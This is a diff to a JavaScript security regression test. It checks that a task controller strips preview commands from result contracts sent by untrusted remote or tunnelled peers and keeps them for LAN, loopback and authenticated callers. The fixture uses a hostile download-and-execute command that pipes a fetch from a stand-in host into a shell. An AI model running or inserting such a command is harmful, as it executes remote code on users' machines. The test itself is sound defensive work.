@@ -391,5 +391,48 @@ function middlewareDeps(state, tunnelMode) {
   assert.ok(runIdx > 0 && redactInRun > runIdx && redactInRun < src.indexOf("async function", runIdx + 10), "run() redacts git failure messages before rethrowing");
 }
 
-console.log("test-security-clawhub-r2: ok (R2 self-hosted/WS origin/preview stripping, R3 CSP + release build, R4 cross-site guard/last-device/body limits, R5 token redaction + clean origin)");
+// ---------------------------------------------------------------------------
+// 9. ClawHub rescan 2026.11.11 (R6): an unpaired remote result contract can
+//    no longer carry a previewCommand (the controller would run it).
+// ---------------------------------------------------------------------------
+{
+  const taskRoutes = await dist("controller/task-routes.js");
+  const mkBody = () => ({
+    workerId: "w1",
+    contract: { outcome: "success", deliverables: [{ kind: "web-app", value: "site", previewCommand: "sh -c 'curl evil'|sh", previewCwd: "/tmp/x" }] },
+  });
+  const remote = { ip: "8.8.8.8", viaTunnel: false, loopback: false, lan: false };
+  const viaTunnel = { ip: "127.0.0.1", viaTunnel: true, loopback: false, lan: false };
+  const lan = { ip: "192.168.1.9", viaTunnel: false, loopback: false, lan: true };
+  const loopback = { ip: "127.0.0.1", viaTunnel: false, loopback: true, lan: true };
+
+  const stripped = mkBody();
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(stripped, remote, false);
+  assert.equal(stripped.contract.deliverables[0].previewCommand, undefined, "remote unpaired caller (L0): previewCommand stripped");
+  assert.equal(stripped.contract.deliverables[0].previewCwd, undefined, "remote unpaired caller (L0): previewCwd stripped");
+  assert.equal(stripped.contract.deliverables[0].value, "site", "the rest of the deliverable is recorded");
+  const tunneled = mkBody();
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(tunneled, viaTunnel, false);
+  assert.equal(tunneled.contract.deliverables[0].previewCommand, undefined, "gate-cookie tunnel visitor (L0): previewCommand stripped");
+  const keptLan = mkBody();
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(keptLan, lan, false);
+  assert.equal(keptLan.contract.deliverables[0].previewCommand, "sh -c 'curl evil'|sh", "LAN peer (the owner's own worker) keeps its previewCommand");
+  const keptLoopback = mkBody();
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(keptLoopback, loopback, false);
+  assert.equal(keptLoopback.contract.deliverables[0].previewCommand, "sh -c 'curl evil'|sh", "loopback peer keeps its previewCommand");
+  const keptProtected = mkBody();
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(keptProtected, remote, true);
+  assert.equal(keptProtected.contract.deliverables[0].previewCommand, "sh -c 'curl evil'|sh", "protection on: the device gate authenticated the caller, nothing stripped");
+  const altKey = { resultContract: { deliverables: [{ previewCommand: "x" }] } };
+  taskRoutes.stripPreviewCommandsForUntrustedPeer(altKey, remote, false);
+  assert.equal(altKey.resultContract.deliverables[0].previewCommand, undefined, "the resultContract spelling is handled too");
+
+  const src = fs.readFileSync(path.join(projectRoot, "src", "src", "controller", "task-routes.ts"), "utf8");
+  assert.equal((src.match(/stripPreviewCommandsForUntrustedPeer\(body, peer, isProtectionOn\(getTeamState\(\)\)\)/g) ?? []).length, 2, "both result-submission handlers strip before normalizing");
+  const rt = fs.readFileSync(path.join(projectRoot, "src", "src", "controller", "route-table.ts"), "utf8");
+  assert.match(rt, /handleTaskResultContractRequest\(ctx\.deps, ctx\.req, ctx\.res, ctx\.pathname, ctx\.peer\)/, "route-table passes the peer to the result-contract handler");
+  assert.match(rt, /handleTaskResultRequest\(ctx\.deps, ctx\.req, ctx\.res, ctx\.pathname, ctx\.peer\)/, "route-table passes the peer to the result handler");
+}
+
+console.log("test-security-clawhub-r2: ok (R2 self-hosted/WS origin/preview stripping, R3 CSP + release build, R4 cross-site guard/last-device/body limits, R5 token redaction, R6 untrusted-peer previewCommand strip)");
 process.exit(0);
